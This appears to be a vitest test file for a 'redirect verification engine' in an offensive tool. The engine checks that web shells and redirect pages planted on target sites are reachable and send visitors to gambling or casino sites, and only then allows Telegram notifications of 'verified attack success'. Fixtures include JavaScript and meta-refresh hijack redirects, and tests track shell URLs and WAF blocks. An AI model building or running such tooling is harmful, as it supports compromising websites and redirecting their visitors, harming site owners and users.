/**
 * Tests: Redirect Verification Engine
 * 
 * Tests the redirect verification logic used to gate Telegram notifications.
 * Only verified attack successes with working redirects should trigger notifications.
 */
import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import {
  verifyDeployedUrl,
  verifyDeployedUrls,
  shouldSendNotification,
  checkRedirectMatch,
  type VerificationResult,
  type BatchVerificationResult,
} from "./redirect-verifier";

// ═══════════════════════════════════════════════════════
//  Unit Tests: checkRedirectMatch
// ═══════════════════════════════════════════════════════

describe("checkRedirectMatch", () => {
  it("should match identical URLs", () => {
    expect(checkRedirectMatch(
      "https://gambling-site.com/page",
      "https://gambling-site.com/page"
    )).toBe(true);
  });

  it("should match URLs with trailing slash differences", () => {
    expect(checkRedirectMatch(
      "https://gambling-site.com/page/",
      "https://gambling-site.com/page"
    )).toBe(true);
  });

  it("should match URLs with www prefix differences", () => {
    expect(checkRedirectMatch(
      "https://www.gambling-site.com/page",
      "https://gambling-site.com/page"
    )).toBe(true);
  });

  it("should match URLs with different protocols (http vs https)", () => {
    // After normalization, protocol is stripped
    expect(checkRedirectMatch(
      "http://gambling-site.com/page",
      "https://gambling-site.com/page"
    )).toBe(true);
  });

  it("should match same domain with different paths (domain-level match)", () => {
    expect(checkRedirectMatch(
      "https://gambling-site.com/some-other-page",
      "https://gambling-site.com/"
    )).toBe(true);
  });

  it("should NOT match completely different domains", () => {
    expect(checkRedirectMatch(
      "https://wrong-site.com/page",
      "https://gambling-site.com/page"
    )).toBe(false);
  });

  it("should return false when actualDestination is null", () => {
    expect(checkRedirectMatch(null, "https://gambling-site.com")).toBe(false);
  });

  it("should return false when expectedRedirectUrl is null", () => {
    expect(checkRedirectMatch("https://gambling-site.com", null)).toBe(false);
  });

  it("should return false when both are null", () => {
    expect(checkRedirectMatch(null, null)).toBe(false);
  });

  it("should handle case-insensitive matching", () => {
    expect(checkRedirectMatch(
      "https://GAMBLING-SITE.COM/Page",
      "https://gambling-site.com/page"
    )).toBe(true);
  });
});

// ═══════════════════════════════════════════════════════
//  Unit Tests: verifyDeployedUrl (mocked fetch)
// ═══════════════════════════════════════════════════════

describe("verifyDeployedUrl", () => {
  const originalFetch = globalThis.fetch;

  afterEach(() => {
    globalThis.fetch = originalFetch;
  });

  it("should verify a direct 200 response as accessible", async () => {
    globalThis.fetch = vi.fn().mockResolvedValue(
      new Response("<html><body>Hello World</body></html>", {
        status: 200,
        headers: { "content-type": "text/html" },
      })
    );

    const result = await verifyDeployedUrl("https://target.com/shell.php");
    
    expect(result.status).toBe("verified");
    expect(result.isAccessible).toBe(true);
    expect(result.deployedUrl).toBe("https://target.com/shell.php");
    expect(result.finalStatusCode).toBe(200);
    expect(result.redirectChain.length).toBeGreaterThanOrEqual(1);
  });

  it("should follow 301 redirect chain and verify destination", async () => {
    let callCount = 0;
    globalThis.fetch = vi.fn().mockImplementation((url: string) => {
      callCount++;
      if (callCount === 1) {
        // First call: 301 redirect
        return Promise.resolve(new Response("", {
          status: 301,
          headers: { "location": "https://gambling-site.com/" },
        }));
      }
      // Second call: final destination
      return Promise.resolve(new Response("<html>Gambling Site</html>", {
        status: 200,
        headers: { "content-type": "text/html" },
      }));
    });

    const result = await verifyDeployedUrl(
      "https://target.com/redirect.php",
      "https://gambling-site.com/"
    );
    
    expect(result.status).toBe("verified");
    expect(result.redirectMatches).toBe(true);
    expect(result.redirectChain.length).toBe(2);
    expect(result.redirectChain[0].statusCode).toBe(301);
    expect(result.redirectChain[0].headers["location"]).toBe("https://gambling-site.com/");
  });

  it("should follow 302 redirect chain", async () => {
    let callCount = 0;
    globalThis.fetch = vi.fn().mockImplementation(() => {
      callCount++;
      if (callCount === 1) {
        return Promise.resolve(new Response("", {
          status: 302,
          headers: { "location": "https://casino-site.com/landing" },
        }));
      }
      return Promise.resolve(new Response("<html>Casino</html>", {
        status: 200,
        headers: { "content-type": "text/html" },
      }));
    });

    const result = await verifyDeployedUrl(
      "https://target.com/page.php",
      "https://casino-site.com/"
    );
    
    expect(result.status).toBe("verified");
    expect(result.redirectMatches).toBe(true);
    expect(result.isAccessible).toBe(true);
  });

  it("should detect redirect mismatch", async () => {
    let callCount = 0;
    globalThis.fetch = vi.fn().mockImplementation(() => {
      callCount++;
      if (callCount === 1) {
        return Promise.resolve(new Response("", {
          status: 301,
          headers: { "location": "https://wrong-site.com/" },
        }));
      }
      return Promise.resolve(new Response("<html>Wrong</html>", {
        status: 200,
        headers: { "content-type": "text/html" },
      }));
    });

    const result = await verifyDeployedUrl(
      "https://target.com/redirect.php",
      "https://gambling-site.com/"
    );
    
    expect(result.status).toBe("redirect_mismatch");
    expect(result.redirectMatches).toBe(false);
  });

  it("should detect dead URL (404)", async () => {
    globalThis.fetch = vi.fn().mockResolvedValue(
      new Response("Not Found", { status: 404 })
    );

    const result = await verifyDeployedUrl("https://target.com/deleted.php");
    
    expect(result.status).toBe("dead_url");
    expect(result.isAccessible).toBe(false);
    expect(result.finalStatusCode).toBe(404);
  });

  it("should detect dead URL (500)", async () => {
    globalThis.fetch = vi.fn().mockResolvedValue(
      new Response("Server Error", { status: 500 })
    );

    const result = await verifyDeployedUrl("https://target.com/error.php");
    
    expect(result.status).toBe("dead_url");
    expect(result.isAccessible).toBe(false);
  });

  it("should detect WAF/Cloudflare block page", async () => {
    globalThis.fetch = vi.fn().mockResolvedValue(
      new Response(
        '<html><head><title>Attention Required! | Cloudflare</title></head><body>Checking your browser before accessing...</body></html>',
        { status: 200, headers: { "content-type": "text/html" } }
      )
    );

    const result = await verifyDeployedUrl("https://target.com/shell.php");
    
    expect(result.status).toBe("waf_blocked");
    expect(result.isAccessible).toBe(false);
  });

  it("should detect JavaScript redirect in page body", async () => {
    globalThis.fetch = vi.fn().mockResolvedValue(
      new Response(
        `<html><head><script>window.location.href = "https://gambling-site.com/landing";</script></head><body>Redirecting...</body></html>`,
        { status: 200, headers: { "content-type": "text/html" } }
      )
    );

    const result = await verifyDeployedUrl(
      "https://target.com/page.php",
      "https://gambling-site.com/"
    );
    
    expect(result.status).toBe("verified");
    expect(result.actualDestination).toBe("https://gambling-site.com/landing");
    expect(result.redirectMatches).toBe(true);
  });

  it("should detect meta refresh redirect", async () => {
    globalThis.fetch = vi.fn().mockResolvedValue(
      new Response(
        '<html><head><meta http-equiv="refresh" content="0;url=https://gambling-site.com/promo"></head><body></body></html>',
        { status: 200, headers: { "content-type": "text/html" } }
      )
    );

    const result = await verifyDeployedUrl(
      "https://target.com/page.html",
      "https://gambling-site.com/"
    );
    
    expect(result.status).toBe("verified");
    expect(result.actualDestination).toBe("https://gambling-site.com/promo");
    expect(result.redirectMatches).toBe(true);
  });

  it("should handle timeout errors", async () => {
    globalThis.fetch = vi.fn().mockImplementation(() => {
      const error = new Error("The operation was aborted");
      error.name = "AbortError";
      return Promise.reject(error);
    });

    const result = await verifyDeployedUrl("https://slow-target.com/page.php");
    
    expect(result.status).toBe("timeout");
    expect(result.isAccessible).toBe(false);
  });

  it("should handle network errors", async () => {
    globalThis.fetch = vi.fn().mockRejectedValue(
      new Error("getaddrinfo ENOTFOUND nonexistent.com")
    );

    const result = await verifyDeployedUrl("https://nonexistent.com/page.php");
    
    expect(result.status).toBe("error");
    expect(result.isAccessible).toBe(false);
    expect(result.error).toContain("ENOTFOUND");
  });

  it("should handle multi-hop redirect chain (301 → 302 → 200)", async () => {
    let callCount = 0;
    globalThis.fetch = vi.fn().mockImplementation(() => {
      callCount++;
      if (callCount === 1) {
        return Promise.resolve(new Response("", {
          status: 301,
          headers: { "location": "https://intermediate.com/step1" },
        }));
      }
      if (callCount === 2) {
        return Promise.resolve(new Response("", {
          status: 302,
          headers: { "location": "https://gambling-site.com/final" },
        }));
      }
      return Promise.resolve(new Response("<html>Final</html>", {
        status: 200,
        headers: { "content-type": "text/html" },
      }));
    });

    const result = await verifyDeployedUrl(
      "https://target.com/redirect.php",
      "https://gambling-site.com/"
    );
    
    expect(result.status).toBe("verified");
    expect(result.redirectChain.length).toBe(3);
    expect(result.redirectMatches).toBe(true);
  });

  it("should verify without expected redirect (just check accessibility)", async () => {
    globalThis.fetch = vi.fn().mockResolvedValue(
      new Response("<html>Content deployed</html>", {
        status: 200,
        headers: { "content-type": "text/html" },
      })
    );

    const result = await verifyDeployedUrl("https://target.com/content.html");
    
    expect(result.status).toBe("verified");
    expect(result.isAccessible).toBe(true);
    expect(result.redirectMatches).toBe(false); // No expected URL to match
  });
});

// ═══════════════════════════════════════════════════════
//  Unit Tests: verifyDeployedUrls (batch)
// ═══════════════════════════════════════════════════════

describe("verifyDeployedUrls", () => {
  const originalFetch = globalThis.fetch;

  afterEach(() => {
    globalThis.fetch = originalFetch;
  });

  it("should verify multiple URLs in batch", async () => {
    globalThis.fetch = vi.fn().mockResolvedValue(
      new Response("<html>OK</html>", {
        status: 200,
        headers: { "content-type": "text/html" },
      })
    );

    const result = await verifyDeployedUrls([
      "https://target1.com/shell.php",
      "https://target2.com/shell.php",
    ]);
    
    expect(result.totalChecked).toBe(2);
    expect(result.verified).toBe(2);
    expect(result.passRate).toBe(100);
    expect(result.summary).toContain("✅ 2 verified");
  });

  it("should handle mixed results in batch", async () => {
    let callCount = 0;
    globalThis.fetch = vi.fn().mockImplementation(() => {
      callCount++;
      if (callCount <= 1) {
        // First URL: success
        return Promise.resolve(new Response("<html>OK</html>", {
          status: 200,
          headers: { "content-type": "text/html" },
        }));
      }
      // Second URL: 404
      return Promise.resolve(new Response("Not Found", { status: 404 }));
    });

    const result = await verifyDeployedUrls([
      "https://target1.com/shell.php",
      "https://target2.com/shell.php",
    ], null, 2);
    
    expect(result.totalChecked).toBe(2);
    expect(result.verified).toBe(1);
    expect(result.dead).toBe(1);
    expect(result.passRate).toBe(50);
  });

  it("should return empty summary for no URLs", async () => {
    const result = await verifyDeployedUrls([]);
    
    expect(result.totalChecked).toBe(0);
    expect(result.verified).toBe(0);
    expect(result.passRate).toBe(0);
    expect(result.summary).toBe("No URLs to verify");
  });
});

// ═══════════════════════════════════════════════════════
//  Unit Tests: shouldSendNotification
// ═══════════════════════════════════════════════════════

describe("shouldSendNotification", () => {
  const originalFetch = globalThis.fetch;

  afterEach(() => {
    globalThis.fetch = originalFetch;
  });

  it("should return shouldSend=false when no URLs provided", async () => {
    const result = await shouldSendNotification([]);
    
    expect(result.shouldSend).toBe(false);
    expect(result.verifiedCount).toBe(0);
    expect(result.verificationSummary).toBe("No deployed URLs to verify");
  });

  it("should return shouldSend=true when at least 1 URL is verified", async () => {
    globalThis.fetch = vi.fn().mockResolvedValue(
      new Response("<html>OK</html>", {
        status: 200,
        headers: { "content-type": "text/html" },
      })
    );

    // No expected redirect URL — just check accessibility
    const result = await shouldSendNotification(
      ["https://target.com/shell.php"],
    );
    
    expect(result.shouldSend).toBe(true);
    expect(result.verifiedCount).toBeGreaterThanOrEqual(1);
  });

  it("should return shouldSend=false when all URLs are dead", async () => {
    globalThis.fetch = vi.fn().mockResolvedValue(
      new Response("Not Found", { status: 404 })
    );

    const result = await shouldSendNotification(
      ["https://target.com/deleted.php"],
      "https://gambling-site.com/"
    );
    
    expect(result.shouldSend).toBe(false);
    expect(result.verifiedCount).toBe(0);
  });

  it("should limit verification to max 5 URLs", async () => {
    const fetchSpy = vi.fn().mockResolvedValue(
      new Response("<html>OK</html>", {
        status: 200,
        headers: { "content-type": "text/html" },
      })
    );
    globalThis.fetch = fetchSpy;

    const urls = Array.from({ length: 10 }, (_, i) => `https://target${i}.com/shell.php`);
    const result = await shouldSendNotification(urls);
    
    // Should only check first 5
    expect(result.totalCount).toBe(5);
  });

  it("should include redirect chain text for verified URLs", async () => {
    let callCount = 0;
    globalThis.fetch = vi.fn().mockImplementation(() => {
      callCount++;
      if (callCount === 1) {
        return Promise.resolve(new Response("", {
          status: 301,
          headers: { "location": "https://gambling-site.com/" },
        }));
      }
      return Promise.resolve(new Response("<html>OK</html>", {
        status: 200,
        headers: { "content-type": "text/html" },
      }));
    });

    const result = await shouldSendNotification(
      ["https://target.com/redirect.php"],
      "https://gambling-site.com/"
    );
    
    expect(result.shouldSend).toBe(true);
    expect(result.redirectChainText).toContain("target.com");
  });
});

// ═══════════════════════════════════════════════════════
//  Integration Tests: Telegram Notifier uses Redirect Verification
// ═══════════════════════════════════════════════════════

describe("Telegram Notifier Integration", () => {
  it("telegram-notifier should import redirect-verifier", async () => {
    const fs = await import("fs");
    const content = fs.readFileSync("server/telegram-notifier.ts", "utf-8");
    
    expect(content).toContain('import { shouldSendNotification as verifyRedirectBeforeSend } from "./redirect-verifier"');
  });

  it("telegram-notifier should call redirect verification before sending", async () => {
    const fs = await import("fs");
    const content = fs.readFileSync("server/telegram-notifier.ts", "utf-8");
    
    // Should have the verification gate
    expect(content).toContain("REDIRECT VERIFICATION GATE");
    expect(content).toContain("verifyRedirectBeforeSend");
    expect(content).toContain("verification.shouldSend");
  });

  it("telegram-notifier should block notifications when verification fails", async () => {
    const fs = await import("fs");
    const content = fs.readFileSync("server/telegram-notifier.ts", "utf-8");
    
    // Should block when verification fails
    expect(content).toContain("Redirect verification FAILED");
    expect(content).toContain("Blocking notification");
  });

  it("telegram-notifier should enrich notification with verification data", async () => {
    const fs = await import("fs");
    const content = fs.readFileSync("server/telegram-notifier.ts", "utf-8");
    
    // Should add verification info to notification details
    expect(content).toContain("Redirect Verified");
    expect(content).toContain("redirectChainText");
  });

  it("telegram-notifier should still send if verification engine errors", async () => {
    const fs = await import("fs");
    const content = fs.readFileSync("server/telegram-notifier.ts", "utf-8");
    
    // Should have error handling that doesn't block on verification errors
    expect(content).toContain("Redirect verification error (sending anyway)");
  });

  it("telegram-notifier should log VERIFIED in success path", async () => {
    const fs = await import("fs");
    const content = fs.readFileSync("server/telegram-notifier.ts", "utf-8");
    
    expect(content).toContain("Sending VERIFIED attack success");
  });
});

// ═══════════════════════════════════════════════════════
//  Edge Case Tests
// ═══════════════════════════════════════════════════════

describe("Edge Cases", () => {
  const originalFetch = globalThis.fetch;

  afterEach(() => {
    globalThis.fetch = originalFetch;
  });

  it("should handle relative redirect URLs", async () => {
    let callCount = 0;
    globalThis.fetch = vi.fn().mockImplementation(() => {
      callCount++;
      if (callCount === 1) {
        return Promise.resolve(new Response("", {
          status: 301,
          headers: { "location": "/new-path" },
        }));
      }
      return Promise.resolve(new Response("<html>OK</html>", {
        status: 200,
        headers: { "content-type": "text/html" },
      }));
    });

    const result = await verifyDeployedUrl("https://target.com/old-path");
    
    expect(result.status).toBe("verified");
    expect(result.isAccessible).toBe(true);
    // The relative redirect should be resolved to absolute
    expect(result.redirectChain[0].headers["location"]).toBe("/new-path");
  });

  it("should handle location.replace JS redirect", async () => {
    globalThis.fetch = vi.fn().mockResolvedValue(
      new Response(
        `<html><script>location.replace("https://gambling-site.com/promo")</script></html>`,
        { status: 200, headers: { "content-type": "text/html" } }
      )
    );

    const result = await verifyDeployedUrl(
      "https://target.com/page.php",
      "https://gambling-site.com/"
    );
    
    expect(result.actualDestination).toBe("https://gambling-site.com/promo");
    expect(result.redirectMatches).toBe(true);
  });

  it("should measure response time", async () => {
    globalThis.fetch = vi.fn().mockImplementation(() => {
      return new Promise(resolve => {
        setTimeout(() => {
          resolve(new Response("<html>OK</html>", {
            status: 200,
            headers: { "content-type": "text/html" },
          }));
        }, 50);
      });
    });

    const result = await verifyDeployedUrl("https://target.com/page.php");
    
    expect(result.responseTimeMs).toBeGreaterThanOrEqual(40);
  });
});
